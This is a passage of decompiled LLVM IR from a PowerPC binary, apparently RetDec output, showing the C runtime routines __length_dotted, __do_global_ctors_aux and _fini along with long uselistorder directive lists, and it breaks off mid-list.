dec_label_pc_10014c3c:                            ; preds = %dec_label_pc_10014bd4, %dec_label_pc_10014c28, %dec_label_pc_10014c2c, %entry
  %storemerge1 = phi i32 [ -1, %entry ], [ %v1_10014c2c, %dec_label_pc_10014c2c ], [ %v0_10014c30.pre.pre, %dec_label_pc_10014c28 ], [ -1, %dec_label_pc_10014bd4 ]
  %v1_10014c4c = call %0 @__asm_mtcrf(i32 8, i32 %v0_10014b68)
  %v9_10014c4c = extractvalue %0 %v1_10014c4c, 7
  store i4 %v9_10014c4c, i4* @cr4, align 1
  ret i32 %storemerge1

; uselistorder directives
  uselistorder i32 %v0_10014c30.pre.pre, { 1, 0 }
  uselistorder i1 %v3_10014c1c, { 0, 2, 1 }
  uselistorder i32 %v5_10014c18, { 1, 0 }
  uselistorder i32 %v5_10014c1821, { 5, 4, 0, 3, 2, 1 }
  uselistorder i32 %v0_10014b68, { 1, 0, 2, 3 }
  uselistorder i32* %r27.global-to-local, { 0, 7, 1, 4, 2, 5, 3, 6, 8 }
  uselistorder i32* %r11.global-to-local, { 0, 2, 1, 3 }
  uselistorder i4* @cr4, { 3, 4, 5, 2, 0, 6, 1 }
  uselistorder %0 (i32, i32)* @__asm_mtcrf, { 2, 3, 0, 4, 1 }
  uselistorder i32 ()* @memcpy, { 12, 5, 11, 10, 9, 4, 3, 8, 7, 2, 21, 18, 17, 0, 19, 6, 1, 16, 15, 14, 20, 13 }
  uselistorder i32* @r5, { 41, 42, 43, 3, 44, 45, 46, 11, 57, 58, 50, 51, 37, 4, 52, 1, 53, 12, 13, 14, 15, 16, 17, 59, 18, 19, 20, 21, 22, 23, 72, 9, 10, 8, 5, 54, 55, 64, 65, 66, 38, 24, 25, 26, 73, 74, 75, 76, 67, 68, 2, 69, 70, 71, 27, 29, 28, 30, 0, 31, 32, 33, 60, 61, 47, 48, 34, 35, 36, 49, 7, 62, 63, 6, 39, 40, 56 }
  uselistorder i32* @r29, { 76, 77, 78, 79, 80, 144, 145, 1, 81, 14, 82, 83, 84, 85, 87, 86, 88, 89, 90, 91, 92, 20, 21, 22, 23, 24, 2, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 45, 106, 108, 109, 125, 126, 146, 147, 47, 48, 49, 46, 131, 16, 50, 51, 3, 52, 53, 54, 55, 56, 57, 148, 149, 150, 151, 152, 153, 154, 4, 35, 130, 133, 134, 135, 136, 25, 26, 137, 5, 138, 139, 140, 141, 142, 143, 127, 128, 129, 6, 132, 7, 155, 156, 157, 58, 59, 8, 60, 61, 62, 63, 116, 117, 15, 118, 110, 111, 112, 115, 113, 17, 9, 0, 114, 64, 65, 66, 67, 68, 69, 70, 73, 10, 13, 11, 74, 19, 71, 72, 158, 159, 160, 161, 119, 120, 121, 122, 123, 12, 124, 107, 27, 28, 29, 30, 31, 32, 33, 34, 36, 37, 38, 39, 40, 41, 42, 43, 44, 75, 18 }
  uselistorder i32* @r28, { 2, 77, 78, 79, 80, 81, 82, 87, 88, 83, 84, 85, 86, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 17, 3, 16, 18, 19, 20, 21, 22, 23, 99, 103, 100, 101, 102, 1, 104, 105, 42, 43, 129, 130, 137, 138, 44, 4, 45, 46, 47, 48, 49, 5, 139, 140, 141, 142, 149, 6, 35, 36, 37, 12, 38, 24, 25, 26, 27, 28, 29, 30, 31, 32, 133, 134, 135, 136, 131, 132, 143, 144, 145, 146, 147, 50, 51, 114, 7, 115, 116, 108, 109, 110, 111, 112, 113, 52, 53, 54, 8, 55, 56, 9, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 0, 73, 74, 13, 14, 15, 148, 117, 118, 119, 120, 10, 121, 11, 122, 123, 124, 125, 126, 127, 128, 75, 76, 106, 107, 33, 34, 39, 40, 41 }
  uselistorder i32 23, { 11, 14, 15, 16, 7, 8, 9, 0, 1, 2, 3, 6, 4, 5, 10, 12, 13 }
  uselistorder i32 18, { 1, 0, 3, 4, 2, 5 }
  uselistorder i32 8, { 83, 84, 85, 86, 87, 88, 18, 19, 89, 90, 91, 92, 93, 94, 24, 25, 20, 13, 14, 15, 26, 27, 28, 29, 30, 95, 96, 97, 98, 17, 43, 118, 0, 100, 44, 45, 46, 47, 48, 49, 50, 51, 10, 52, 53, 54, 130, 131, 138, 141, 8, 76, 77, 11, 31, 12, 80, 115, 32, 122, 121, 119, 120, 33, 34, 35, 123, 124, 125, 126, 127, 128, 1, 108, 109, 110, 21, 135, 136, 137, 2, 142, 3, 139, 140, 101, 102, 36, 103, 37, 55, 56, 57, 58, 59, 22, 60, 61, 62, 63, 4, 5, 64, 65, 9, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 7, 6, 132, 133, 134, 104, 105, 106, 107, 99, 38, 39, 40, 41, 42, 78, 79, 23, 81, 82, 111, 112, 113, 114, 116, 117, 16, 129 }
  uselistorder i32* @r30, { 82, 83, 84, 8, 85, 87, 89, 90, 91, 92, 93, 86, 88, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 19, 20, 21, 1, 22, 23, 24, 7, 25, 26, 108, 105, 106, 5, 107, 4, 40, 41, 42, 9, 43, 44, 45, 110, 111, 112, 121, 122, 123, 124, 17, 125, 126, 127, 128, 129, 130, 131, 132, 46, 47, 48, 49, 50, 143, 144, 10, 51, 52, 53, 54, 55, 11, 153, 154, 155, 156, 12, 146, 157, 168, 158, 159, 27, 0, 79, 13, 80, 81, 147, 148, 149, 28, 29, 30, 31, 32, 150, 151, 152, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 145, 160, 161, 162, 163, 164, 165, 166, 14, 167, 56, 57, 119, 117, 118, 120, 116, 114, 113, 6, 115, 58, 59, 60, 61, 62, 2, 64, 18, 65, 15, 66, 67, 63, 68, 69, 70, 71, 72, 73, 74, 16, 75, 76, 3, 77, 78, 109, 33, 34, 35, 36, 37, 38, 39 }
  uselistorder i1 false, { 2, 3, 5, 13, 6, 7, 9, 10, 0, 11, 17, 18, 19, 14, 15, 16, 4, 12, 1, 8, 20 }
  uselistorder i32* @r31, { 137, 2, 7, 138, 6, 139, 140, 141, 8, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 45, 50, 9, 39, 10, 11, 51, 52, 53, 156, 157, 158, 159, 1, 160, 161, 162, 163, 164, 165, 166, 167, 12, 168, 64, 65, 66, 67, 68, 169, 13, 170, 171, 172, 173, 14, 174, 175, 176, 177, 178, 179, 69, 70, 71, 72, 73, 74, 75, 76, 77, 15, 78, 16, 271, 272, 273, 17, 186, 185, 3, 187, 188, 211, 238, 239, 240, 241, 242, 131, 132, 133, 134, 189, 18, 190, 191, 19, 200, 201, 20, 202, 203, 79, 80, 81, 254, 255, 256, 82, 83, 21, 84, 85, 86, 87, 22, 88, 23, 89, 90, 91, 44, 92, 0, 274, 275, 276, 24, 46, 277, 40, 258, 25, 259, 283, 284, 123, 42, 124, 125, 278, 281, 282, 62, 63, 126, 127, 128, 129, 54, 55, 56, 57, 58, 135, 136, 4, 260, 261, 262, 263, 264, 265, 59, 60, 61, 266, 267, 268, 269, 270, 243, 244, 245, 27, 246, 247, 248, 26, 249, 250, 251, 252, 253, 257, 285, 286, 287, 288, 289, 290, 291, 292, 293, 294, 93, 94, 204, 205, 206, 28, 207, 208, 209, 194, 195, 196, 197, 198, 29, 43, 199, 5, 192, 193, 30, 210, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 33, 32, 112, 31, 116, 117, 34, 118, 119, 120, 121, 48, 49, 114, 113, 115, 279, 35, 280, 47, 36, 41, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 224, 223, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 180, 181, 182, 183, 37, 38, 184, 122, 130 }
  uselistorder i32* @r23, { 1, 2, 3, 7, 4, 5, 6, 8, 9, 10, 12, 11, 0, 13, 14, 15, 16, 17, 18, 19, 20, 21 }
  uselistorder i32* @r24, { 3, 4, 7, 5, 6, 8, 9, 10, 0, 11, 12, 13, 14, 15, 2, 16, 17, 18, 1, 19, 20, 21, 22, 23, 24, 25 }
  uselistorder i32* @r6, { 15, 16, 2, 3, 4, 5, 6, 7, 8, 9, 0, 1, 10, 11, 12, 17, 13, 14, 18 }
  uselistorder i32* @r25, { 12, 13, 14, 16, 17, 15, 18, 1, 2, 19, 20, 21, 22, 23, 24, 25, 26, 27, 32, 35, 3, 4, 28, 29, 30, 31, 0, 8, 9, 10, 11, 33, 34, 5, 6, 7 }
  uselistorder i32* @r26, { 1, 31, 32, 33, 34, 35, 36, 37, 40, 38, 39, 41, 42, 43, 44, 45, 3, 4, 46, 47, 48, 49, 51, 2, 52, 53, 55, 56, 57, 58, 59, 60, 61, 11, 12, 78, 5, 6, 7, 74, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 75, 13, 14, 15, 16, 17, 18, 20, 19, 21, 22, 23, 24, 25, 26, 27, 28, 0, 76, 77, 54, 29, 30, 50, 8, 9, 10 }
  uselistorder i32 ()* @__asm_mfcr, { 28, 35, 27, 26, 12, 34, 20, 30, 9, 8, 7, 6, 5, 15, 31, 41, 25, 40, 33, 32, 10, 29, 11, 39, 23, 21, 38, 19, 3, 14, 18, 13, 37, 24, 17, 16, 36, 4, 2, 1, 0, 22 }
  uselistorder label %dec_label_pc_10014c3c, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_10014c2c, { 1, 0 }
  uselistorder label %dec_label_pc_10014c14, { 1, 0 }
  uselistorder label %dec_label_pc_10014c10, { 1, 0 }
  uselistorder label %dec_label_pc_10014c00, { 1, 0 }
  uselistorder label %dec_label_pc_10014bbc, { 1, 0 }
  uselistorder label %dec_label_pc_10014ba4, { 1, 0 }
  uselistorder label %dec_label_pc_10014b9c, { 1, 0 }
}

define i32 @__length_dotted() local_unnamed_addr {
entry:
  %r11.global-to-local = alloca i32, align 4
  %v0_10014c58 = load i32, i32* @r3, align 4
  store i32 %v0_10014c58, i32* %r11.global-to-local, align 4
  %v3_10014c58 = icmp eq i32 %v0_10014c58, 0
  %v0_10014c60 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_10014c58, i32 %v0_10014c60)
  %v0_10014c70 = load i32, i32* @r4, align 4
  br label %dec_label_pc_10014c7c

dec_label_pc_10014c68:                            ; preds = %dec_label_pc_10014c78
  %v1_10014c68 = add i32 %v1_10014c7c, 2
  br label %dec_label_pc_10014c98

dec_label_pc_10014c78:                            ; preds = %dec_label_pc_10014c7c
  %v2_10014c90 = add i32 %v1_10014c80, %v5_10014c7c
  %v3_10014c8c = icmp eq i32 %v1_10014c88, 192
  br i1 %v3_10014c8c, label %dec_label_pc_10014c68, label %dec_label_pc_10014c7c

dec_label_pc_10014c7c:                            ; preds = %dec_label_pc_10014c78, %entry
  %v1_10014c7c = phi i32 [ %v2_10014c90, %dec_label_pc_10014c78 ], [ %v0_10014c70, %entry ]
  %v0_10014c7c = load i32, i32* %r11.global-to-local, align 4
  %v2_10014c7c = add i32 %v0_10014c7c, %v1_10014c7c
  %v3_10014c7c = inttoptr i32 %v2_10014c7c to i8*
  %v4_10014c7c = load i8, i8* %v3_10014c7c, align 1
  %v5_10014c7c = zext i8 %v4_10014c7c to i32
  %v1_10014c80 = add i32 %v1_10014c7c, 1
  %v3_10014c84 = icmp eq i8 %v4_10014c7c, 0
  %v1_10014c88 = call i32 @__asm_rlwinm(i32 %v5_10014c7c, i32 0, i32 24, i32 25)
  br i1 %v3_10014c84, label %dec_label_pc_10014c98, label %dec_label_pc_10014c78

dec_label_pc_10014c98:                            ; preds = %dec_label_pc_10014c7c, %dec_label_pc_10014c68
  %v1_10014c98 = phi i32 [ %v1_10014c68, %dec_label_pc_10014c68 ], [ %v1_10014c80, %dec_label_pc_10014c7c ]
  %v0_10014c98 = load i32, i32* @r4, align 4
  %v2_10014c98 = sub i32 %v1_10014c98, %v0_10014c98
  ret i32 %v2_10014c98

; uselistorder directives
  uselistorder i32 %v1_10014c80, { 1, 0 }
  uselistorder i32 %v5_10014c7c, { 1, 0 }
  uselistorder i32 %v1_10014c7c, { 2, 1, 0 }
  uselistorder i32 %v0_10014c58, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @__asm_rlwinm, { 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 38, 4, 5, 6, 21, 52, 53, 1, 46, 2, 47, 0, 51, 22, 54, 55, 56, 7, 36, 37, 3, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 39, 40, 41, 42, 35, 50, 43, 44, 45, 48, 49, 57 }
  uselistorder i32 25, { 1, 2, 3, 4, 5, 0, 6 }
  uselistorder i32 24, { 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 14, 38, 39, 47, 40, 41, 44, 15, 5, 49, 6, 16, 45, 42, 43, 17, 18, 19, 20, 21, 22, 23, 24, 25, 52, 53, 46, 7, 8, 9, 10, 11, 12, 13, 1, 2, 3, 4, 26, 27, 48, 50, 0, 51 }
  uselistorder i8 0, { 37, 35, 4, 38, 2, 39, 40, 24, 44, 42, 23, 43, 41, 22, 45, 46, 47, 48, 5, 50, 49, 25, 6, 51, 52, 7, 53, 54, 21, 27, 57, 55, 56, 26, 58, 59, 8, 61, 60, 28, 62, 63, 0, 64, 65, 66, 9, 67, 10, 68, 11, 1, 12, 69, 70, 71, 73, 74, 75, 76, 72, 77, 13, 78, 79, 80, 81, 83, 84, 85, 86, 82, 87, 3, 14, 15, 16, 17, 18, 19, 88, 89, 90, 92, 91, 20, 93, 94, 95, 96, 97, 98, 100, 29, 101, 102, 99, 103, 104, 105, 106, 108, 107, 109, 110, 111, 112, 113, 114, 115, 116, 118, 117, 120, 119, 121, 30, 123, 122, 36, 124, 31, 125, 127, 128, 126, 32, 129, 130, 34, 131, 33, 132, 133, 134, 135, 136 }
  uselistorder i32 192, { 1, 2, 0, 3 }
  uselistorder i32 2, { 0, 4, 117, 49, 118, 119, 30, 1, 2, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 5, 132, 6, 94, 95, 96, 31, 29, 133, 134, 135, 136, 137, 50, 51, 52, 98, 99, 154, 42, 7, 8, 3, 53, 143, 9, 10, 32, 140, 141, 40, 100, 101, 11, 102, 103, 104, 54, 55, 114, 56, 115, 57, 116, 155, 33, 12, 13, 58, 59, 60, 61, 62, 14, 47, 48, 63, 64, 144, 46, 157, 15, 16, 17, 18, 34, 35, 36, 37, 38, 65, 152, 153, 39, 138, 139, 105, 106, 107, 19, 20, 21, 22, 23, 108, 109, 24, 111, 112, 113, 28, 110, 142, 66, 25, 26, 156, 158, 67, 97, 69, 70, 68, 71, 72, 73, 43, 74, 75, 44, 77, 78, 76, 79, 81, 80, 82, 83, 84, 85, 86, 145, 146, 147, 148, 149, 87, 41, 150, 88, 89, 90, 91, 92, 151, 45, 27, 93 }
  uselistorder i32* @r4, { 95, 96, 1, 97, 98, 99, 100, 2, 101, 102, 103, 104, 9, 10, 105, 106, 107, 108, 109, 110, 111, 112, 113, 136, 133, 134, 114, 115, 116, 117, 118, 6, 119, 120, 121, 130, 131, 83, 11, 52, 53, 54, 55, 56, 57, 58, 59, 146, 7, 8, 75, 76, 138, 25, 26, 14, 93, 94, 15, 16, 135, 77, 12, 122, 123, 129, 132, 139, 140, 141, 3, 60, 61, 62, 13, 63, 64, 124, 125, 126, 127, 128, 4, 78, 79, 145, 65, 66, 67, 68, 0, 69, 70, 71, 137, 72, 73, 74, 5, 17, 18, 142, 143, 144, 19, 20, 21, 22, 23, 24, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 80, 81, 82, 84, 85, 86, 87, 88, 89, 90, 91, 92 }
  uselistorder void (i1, i32)* @__pseudo_cond_branch, { 10, 11, 12, 13, 14, 15, 16, 17, 8, 29, 31, 26, 9, 1, 2, 3, 4, 5, 30, 20, 21, 22, 23, 24, 6, 18, 19, 25, 33, 32, 7, 27, 0, 28 }
}

define i32 @__do_global_ctors_aux(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_1002822c.683 to i32), i32* %r31.global-to-local, align 4
  %v3_10014cbc = load i32, i32* @global_var_1002822c.683, align 4
  %v3_10014cc0 = icmp eq i32 %v3_10014cbc, -1
  br i1 %v3_10014cc0, label %dec_label_pc_10014cdc, label %dec_label_pc_10014cc8

dec_label_pc_10014cc8:                            ; preds = %entry, %dec_label_pc_10014cc8
  %v0_10014cc8 = phi i32 [ %v3_10014cd0, %dec_label_pc_10014cc8 ], [ %v3_10014cbc, %entry ]
  call void @__pseudo_call(i32 %v0_10014cc8)
  %v0_10014cd0 = load i32, i32* %r31.global-to-local, align 4
  %v1_10014cd0 = add i32 %v0_10014cd0, -4
  %v2_10014cd0 = inttoptr i32 %v1_10014cd0 to i32*
  %v3_10014cd0 = load i32, i32* %v2_10014cd0, align 4
  store i32 %v1_10014cd0, i32* %r31.global-to-local, align 4
  %v3_10014cd4 = icmp eq i32 %v3_10014cd0, -1
  br i1 %v3_10014cd4, label %dec_label_pc_10014cdc, label %dec_label_pc_10014cc8

dec_label_pc_10014cdc:                            ; preds = %dec_label_pc_10014cc8, %entry
  %v0_10014cec = load i32, i32* @r3, align 4
  ret i32 %v0_10014cec

; uselistorder directives
  uselistorder i32 %v3_10014cd0, { 1, 0 }
  uselistorder i32 -4, { 28, 12, 13, 14, 21, 22, 23, 24, 25, 15, 16, 2, 3, 4, 5, 6, 7, 8, 9, 10, 27, 26, 32, 33, 29, 30, 31, 17, 18, 19, 20, 0, 11, 1 }
  uselistorder void (i32)* @__pseudo_call, { 2, 1, 3, 4, 0 }
  uselistorder i32 -1, { 363, 364, 16, 47, 60, 300, 301, 246, 130, 302, 61, 303, 51, 62, 304, 63, 305, 227, 228, 113, 114, 65, 64, 229, 48, 49, 230, 231, 232, 189, 71, 69, 67, 233, 234, 235, 70, 68, 66, 236, 237, 190, 238, 191, 306, 25, 26, 192, 307, 193, 52, 308, 72, 247, 131, 3, 4, 248, 249, 53, 250, 251, 73, 74, 194, 365, 29, 30, 31, 366, 195, 370, 27, 28, 310, 32, 320, 321, 322, 134, 323, 324, 325, 326, 327, 328, 329, 132, 330, 133, 331, 332, 333, 334, 196, 252, 197, 54, 5, 198, 253, 254, 199, 200, 201, 255, 202, 335, 336, 33, 34, 35, 203, 337, 338, 204, 311, 315, 316, 50, 256, 257, 258, 123, 55, 259, 260, 261, 262, 135, 263, 6, 75, 264, 265, 266, 267, 268, 205, 269, 136, 347, 348, 137, 7, 8, 138, 56, 270, 206, 207, 271, 272, 273, 274, 76, 77, 353, 139, 78, 79, 80, 81, 82, 83, 84, 0, 373, 371, 85, 287, 288, 140, 208, 289, 38, 39, 209, 290, 36, 37, 210, 245, 9, 141, 86, 87, 291, 142, 239, 10, 88, 57, 298, 40, 41, 211, 143, 115, 299, 89, 240, 354, 355, 46, 241, 369, 292, 90, 293, 212, 294, 42, 43, 295, 296, 352, 58, 213, 339, 116, 340, 341, 144, 345, 91, 349, 374, 375, 275, 350, 92, 214, 215, 342, 343, 216, 344, 120, 59, 217, 218, 219, 220, 221, 44, 222, 145, 93, 317, 117, 312, 314, 313, 17, 18, 19, 20, 21, 22, 23, 118, 119, 276, 15, 277, 11, 278, 279, 223, 146, 24, 224, 280, 281, 1, 283, 284, 2, 147, 148, 225, 45, 149, 124, 285, 150, 282, 318, 12, 13, 286, 151, 319, 152, 309, 153, 94, 95, 96, 367, 368, 97, 98, 99, 100, 101, 102, 103, 104, 105, 242, 106, 107, 108, 109, 110, 111, 372, 112, 376, 154, 187, 243, 244, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 297, 168, 169, 170, 171, 172, 14, 173, 174, 346, 188, 226, 175, 176, 121, 177, 178, 351, 179, 122, 180, 125, 126, 127, 128, 129, 181, 182, 356, 357, 358, 183, 359, 360, 361, 362, 184, 185, 186 }
  uselistorder i32 1, {}
  uselistorder label %dec_label_pc_10014cc8, { 1, 0 }
}

define i32 @call___do_global_ctors_aux() local_unnamed_addr {
entry:
  %v0_10014d08 = load i32, i32* @r3, align 4
  ret i32 %v0_10014d08

; uselistorder directives
  uselistorder i32* @r3, { 20, 21, 171, 172, 175, 173, 174, 0, 176, 11, 177, 53, 54, 55, 178, 179, 180, 45, 181, 22, 12, 142, 143, 13, 23, 95, 96, 97, 269, 281, 278, 279, 182, 190, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 14, 228, 229, 230, 231, 232, 233, 234, 235, 236, 144, 145, 15, 146, 147, 148, 24, 98, 99, 100, 101, 102, 16, 237, 42, 25, 103, 104, 105, 106, 107, 108, 2, 1, 109, 110, 111, 26, 282, 50, 294, 3, 27, 4, 41, 139, 140, 49, 288, 289, 290, 44, 161, 162, 163, 164, 165, 166, 167, 168, 56, 57, 58, 59, 60, 251, 252, 61, 43, 62, 19, 28, 270, 271, 280, 141, 238, 239, 240, 241, 242, 243, 244, 245, 35, 36, 37, 38, 291, 292, 5, 112, 113, 114, 115, 276, 258, 259, 17, 29, 293, 30, 196, 197, 198, 199, 200, 201, 202, 31, 191, 192, 193, 194, 195, 63, 64, 203, 204, 65, 66, 116, 32, 117, 118, 119, 6, 10, 7, 120, 8, 121, 9, 122, 123, 124, 125, 126, 127, 33, 128, 129, 130, 131, 132, 133, 52, 283, 284, 285, 286, 287, 205, 206, 207, 208, 209, 210, 211, 212, 134, 135, 136, 183, 184, 185, 186, 187, 188, 189, 67, 68, 34, 69, 70, 71, 72, 73, 75, 74, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 137, 138, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 51, 169, 170, 246, 247, 248, 249, 250, 253, 18, 254, 255, 256, 257, 260, 261, 262, 264, 263, 265, 266, 267, 46, 268, 47, 272, 273, 274, 275, 277, 39, 40, 48 }
}

define i32 @_fini() local_unnamed_addr {
entry:
  store i32 268520732, i32* @lr, align 4
  %v0_10014d18 = call i32 @__do_global_dtors_aux()
  ret i32 %v0_10014d18

; uselistorder directives
  uselistorder i32 0, { 1192, 1193, 36, 1196, 120, 1194, 1195, 60, 1197, 1198, 1199, 1202, 1200, 0, 1201, 1203, 25, 958, 959, 1219, 1206, 1209, 1210, 1211, 329, 1212, 1213, 1215, 1214, 1216, 1217, 1218, 1220, 1221, 1222, 1204, 1205, 1207, 1208, 121, 1223, 1225, 1226, 1224, 1227, 1228, 1229, 1230, 244, 811, 1231, 245, 812, 813, 122, 123, 822, 823, 97, 824, 825, 826, 827, 828, 829, 830, 124, 184, 832, 831, 125, 833, 834, 127, 126, 835, 330, 836, 837, 838, 129, 128, 839, 840, 254, 331, 841, 130, 1232, 1233, 1234, 1235, 1240, 1236, 64, 1241, 1242, 1237, 1238, 1239, 61, 62, 63, 1243, 332, 37, 38, 39, 232, 1245, 131, 1244, 333, 1246, 1247, 1248, 1249, 132, 1250, 98, 40, 1251, 185, 1252, 1253, 1254, 1162, 186, 960, 961, 1255, 1256, 1257, 1258, 1259, 1260, 1261, 962, 26, 963, 134, 133, 964, 965, 966, 967, 135, 1262, 1263, 1264, 1265, 968, 969, 970, 971, 972, 973, 974, 975, 27, 1266, 1487, 334, 1490, 67, 335, 255, 1491, 336, 1494, 1495, 65, 66, 1496, 1488, 1489, 337, 338, 1280, 1273, 339, 68, 1274, 1275, 1276, 41, 1278, 1279, 1303, 1304, 1324, 1325, 1326, 1327, 256, 242, 243, 341, 1328, 1329, 1330, 1332, 187, 1335, 342, 257, 1337, 1338, 1339, 1340, 340, 258, 1334, 1331, 1333, 1336, 1341, 246, 1342, 1343, 1344, 1, 1415, 1416, 1417, 137, 136, 1418, 2, 138, 259, 1163, 1164, 1165, 3, 976, 977, 189, 979, 978, 57, 4, 980, 188, 5, 981, 191, 982, 58, 6, 983, 190, 1345, 1346, 69, 1347, 1348, 1349, 1350, 1351, 1281, 1282, 1297, 343, 1298, 1299, 1300, 984, 985, 986, 987, 988, 344, 989, 990, 991, 992, 993, 994, 995, 996, 997, 998, 999, 1000, 1001, 139, 140, 1002, 1003, 1004, 1005, 1006, 1007, 1008, 1009, 1010, 42, 1011, 345, 93, 1012, 1013, 1014, 1015, 1016, 141, 1017, 1018, 1019, 1020, 1021, 1022, 1023, 1024, 1395, 1396, 142, 1397, 1398, 1399, 316, 317, 1400, 1401, 1402, 28, 7, 1025, 1026, 1027, 1028, 1029, 1030, 1031, 1032, 1033, 1034, 1035, 1036, 1037, 1038, 1039, 1040, 1041, 1042, 99, 1497, 1498, 1499, 1502, 1500, 8, 192, 1045, 1044, 193, 1043, 100, 1046, 1047, 1048, 143, 1049, 1426, 1440, 1441, 260, 1442, 1178, 1503, 1504, 1505, 1506, 1507, 1443, 346, 347, 1523, 1524, 348, 1529, 1549, 194, 1550, 349, 1541, 9, 1508, 1509, 261, 144, 1144, 1145, 350, 262, 351, 1146, 1147, 72, 73, 1148, 1149, 1150, 352, 1151, 1152, 1153, 70, 71, 1154, 1155, 1510, 1511, 1512, 1513, 1514, 1515, 145, 1522, 899, 900, 901, 902, 903, 146, 904, 905, 906, 318, 907, 353, 908, 263, 354, 355, 356, 1156, 357, 1161, 358, 842, 843, 844, 147, 845, 148, 1185, 1186, 195, 101, 119, 1187, 1188, 10, 1372, 846, 847, 149, 848, 849, 850, 1446, 1448, 43, 1449, 74, 1450, 1447, 1444, 1445, 11, 855, 851, 852, 853, 854, 196, 12, 1453, 1451, 1452, 197, 1454, 1455, 856, 857, 858, 859, 860, 359, 861, 862, 1456, 1457, 360, 1458, 150, 1459, 1460, 1461, 1462, 1463, 1464, 1465, 1466, 13, 14, 814, 1157, 1158, 1159, 75, 76, 1160, 15, 361, 319, 320, 362, 1352, 1353, 198, 1354, 1355, 1356, 1357, 1363, 1364, 1365, 1366, 151, 1367, 1368, 1419, 1403, 264, 363, 1530, 1531, 1532, 1533, 1534, 1535, 1536, 1537, 364, 1538, 16, 17, 1390, 152, 153, 1050, 1051, 29, 30, 265, 31, 1052, 199, 18, 1409, 1410, 1411, 77, 1053, 1054, 200, 365, 1055, 1358, 1359, 1360, 1361, 1362, 1479, 1480, 201, 1277, 19, 92, 1412, 202, 1551, 1552, 1553, 1554, 1555, 1556, 1557, 1558, 1542, 1543, 1544, 78, 1545, 1546, 1547, 1548, 154, 1056, 1057, 1058, 1059, 1060, 1061, 155, 1301, 1283, 1284, 1285, 1286, 1287, 1294, 1290, 1291, 1292, 1293, 203, 1295, 1296, 1288, 20, 79, 1289, 863, 1302, 864, 865, 1062, 1063, 102, 1064, 1065, 1066, 1067, 1068, 247, 1069, 1070, 1071, 156, 1072, 1073, 1074, 1075, 1076, 157, 1077, 1078, 1079, 1080, 1081, 1082, 1083, 158, 1084, 1085, 1086, 1087, 1088, 1089, 1090, 1091, 1092, 1093, 1094, 44, 175, 176, 204, 1095, 1096, 159, 1097, 366, 1098, 1099, 367, 1102, 164, 160, 1100, 1101, 369, 1103, 1104, 1105, 1107, 165, 1108, 21, 22, 166, 167, 161, 162, 1109, 1110, 163, 1111, 1112, 1113, 1114, 1115, 1116, 1117, 1118, 1119, 368, 1120, 1121, 1122, 1123, 1124, 1125, 1126, 1127, 1128, 1129, 815, 1130, 1131, 32, 1133, 80, 103, 168, 370, 1136, 321, 1137, 1132, 1134, 1135, 1138, 1139, 169, 818, 819, 94, 59, 86, 1106, 205, 1517, 1519, 1518, 207, 170, 1521, 1520, 206, 266, 1305, 1306, 1307, 171, 1308, 1309, 1310, 1311, 1312, 1313, 1314, 1315, 1316, 371, 1317, 1318, 1319, 1320, 1321, 1322, 248, 1140, 1141, 372, 1323, 1267, 1268, 1269, 1270, 1271, 1272, 1481, 1501, 373, 1189, 1492, 1493, 866, 1404, 1424, 867, 1430, 1525, 172, 1526, 1485, 1431, 1486, 868, 1432, 869, 870, 871, 872, 873, 874, 875, 876, 877, 878, 1382, 1433, 1434, 879, 1516, 1527, 1528, 1539, 1540, 251, 375, 376, 208, 880, 379, 34, 35, 380, 881, 882, 388, 389, 482, 483, 33, 45, 249, 374, 816, 377, 250, 378, 883, 209, 104, 381, 884, 885, 886, 887, 889, 233, 888, 890, 891, 384, 385, 382, 383, 892, 386, 387, 269, 268, 267, 270, 210, 894, 390, 893, 393, 394, 391, 392, 895, 395, 896, 396, 897, 397, 898, 398, 46, 87, 105, 106, 107, 108, 909, 252, 404, 271, 910, 911, 413, 912, 914, 403, 414, 913, 215, 915, 916, 917, 411, 918, 920, 402, 412, 919, 214, 921, 922, 923, 924, 925, 926, 409, 927, 929, 401, 410, 928, 213, 930, 931, 407, 932, 934, 400, 408, 933, 212, 935, 406, 936, 937, 938, 415, 939, 941, 399, 416, 940, 211, 942, 405, 943, 944, 945, 417, 946, 947, 418, 948, 949, 950, 419, 951, 952, 953, 954, 955, 421, 420, 216, 422, 173, 423, 956, 218, 957, 217, 177, 424, 425, 174, 426, 1142, 220, 1143, 219, 178, 427, 221, 109, 429, 274, 275, 272, 430, 1171, 428, 1166, 1167, 1168, 1169, 1170, 222, 1172, 1173, 431, 322, 1174, 273, 1175, 1176, 1177, 110, 180, 434, 278, 279, 236, 234, 235, 435, 91, 323, 1179, 436, 433, 277, 1180, 179, 437, 276, 239, 237, 238, 438, 432, 1181, 1182, 1183, 1184, 280, 440, 441, 442, 439, 443, 444, 445, 446, 454, 455, 456, 457, 458, 459, 460, 